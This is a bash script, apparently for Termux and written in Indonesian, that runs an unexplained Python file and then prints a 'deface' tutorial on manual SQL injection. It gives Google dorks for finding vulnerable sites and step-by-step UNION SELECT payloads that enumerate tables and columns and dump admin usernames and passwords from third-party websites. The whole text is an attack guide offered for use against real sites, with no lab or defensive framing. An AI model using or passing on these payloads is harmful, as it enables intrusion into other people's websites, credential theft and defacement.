#!/system/xbin/bash
#no recorded ya kntl
clear
python2 KhesaTamvan.py
sleep 2
echo "Tunggu lagi di respon"
sleep 3
clear
echo "_____________________________________________________________" $blue |lolcat
echo •  "Tools    : KEDUT21" |lolcat
echo •  "Creadby  : Fox Cyber Team" |lolcat
echo •  "Contact  : 082297538971" |lolcat
echo •   "TUTORIAL DEFACE SQL MANUAL" |lolcat
echo "_____________________________________________________________" $blue |lolcat
echo " "
echo •  "Bahan Bahan:" |lolcat
sleep 1
echo "1.dork:-product_detail.cfm?catalogid=" |lolcat
echo "-category.asp?id="
echo "-showitems.cfm?category_id="
echo "-pages.php?id="
echo "-detail.php?ID="
sleep 3
echo "2.browser" |lolcat
sleep 1
echo "3.internet" |lolcat
sleep 1
echo "[==========================]"
#Jangan recorded ya kontol
sleep 1
echo •  "Langkah Langkah:" |lolcat
echo " "
sleep 1
echo "1.Masukin dork ke gugel, terus search" |lolcat
echo " "
echo "2.Buka salah satu site nya, cek vuln atau kaga,Cara cek vuln, kasih string atau quote.. ( ' )" |lolcat
echo "contoh"
echo "-site.com/x.php?id=12"
echo "jadi"
echo "-site.com/x.php?id=12'"
echo "kalo eror berarti vuln"
echo " "
echo "3.Masukan order by:-" |lolcat
echo "-site.com/x.php?id=12 order by 1--"
echo "-site.com/x.php?id=12 order by 2--"
echo "-site.com/x.php?id=12 order by 3--"
echo "Dan seterusnya sampe ketemu error nya"
echo " "
echo "4.Kalo eror di site.com/x.php?id=12 order by 10--(berarti columnya ada 9" |lolcat
echo " "
echo "5.Karena column ada 9, kasih union select sesuai column.." |lolcat
echo "-contoh:-site.com/x.php?id=-12 union select 1,2,3,4,5,6,7,8,9--"
echo "-jangan lupa kasih *-* di sebelum parameter *GET* ( *liat angka 12* )"
echo "-Nanti muncul angka ajaib atau angka togel;v"
echo " "
echo "6.Kalian inject database dari angka yang muncul, misal muncul angka *4* *5* *8*(pilih satu aja)" |lolcat
echo "-contoh:-site.com/x.php?id=-12 union select 1,2,3,concat(table_name),5,6,7,8,9 from information_schema.tables where table_schema=database()--"
echo " "
echo "7. Nanti muncul table nya,kalian cari yg berbau admin" |lolcat
echo " "
echo "8.Langkah selanjutnya kalian ubah kata *admin* dengan Hex (cari di google dengan keyword *text to hex*)"|lolcat
echo " "
echo "9.inject lagi untuk mengetahui column dari table *admin*" |lolcat
echo "-site.com/x.php?id=-12 union select 1,2,3,concat(column_name),5,6,7,8,9 from information_schema.column where table_name=0x61646d696e--"
echo "-table_name=0x61646d696e (0x61646d696e itu hex dari kata *admin*)"
echo " "
echo "10.nanti akan muncul:id,name,username,password" |lolcat
echo " "
echo "11.tinggal dump username + passwordnya" |lolcat
echo "-site.com/x.php?id=-12 union select 1,2,3,concat(username,0x3a,password),5,6,7,8,9 from admin--"
echo " "
echo "-from *admin* itu dri nama table nya"
echo "-Misal nama tablenya *adminlogin*"
echo "berarti jadi gini" |lolcat
echo "-site.com/x.php?id=-12 union select 1,2,3,concat(username,0x3a,password),5,6,7,8,9 from adminlogin--"
sleep 2
echo " "
echo "sekian tutor dari gw" |lolcat
